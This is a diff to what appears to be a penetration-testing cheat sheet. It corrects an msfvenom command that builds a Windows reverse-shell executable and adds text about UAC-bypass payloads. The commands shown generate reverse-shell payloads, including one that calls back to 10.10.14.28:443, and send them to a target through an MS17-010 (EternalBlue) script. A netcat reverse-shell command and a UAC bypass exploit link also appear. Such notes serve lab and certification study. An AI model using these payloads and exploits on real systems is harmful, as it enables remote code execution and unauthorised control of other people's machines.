@@ -483,7 +483,7 @@ msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=PORT -f python
 ``` bash
 #https://github.com/helviojunior/MS17-010
 #Generate payload in exe format and use the send_and_execute.py
-msfvenom -p windows/shel_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
+msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
 python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
 # If this does not work, use the paylaod created by the following commands
 msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
@@ -699,7 +699,8 @@ If the return `ConsentPromptBehaviorAdmin` value is 5, it means it is using the 
 [UAC bypass exploit](https://github.com/ScriptKiddieTutorials/Bypass-UAC) (very useful for ARM devices since it does not require compilation)
 
 To use the ps1 exploit, simply modify the last line of elev-function.ps1
-to your desired payload, maybe a reverse shell payload.
+to your desired payload, maybe a reverse shell payload created by msfvenom 
+or using nc.exe to call a reverse shell.
 
 #### GUI version
 If you somehow obtain a GUI access like RDP, you simply need to right click the command prompt or powershell icon and select `run as administrator`
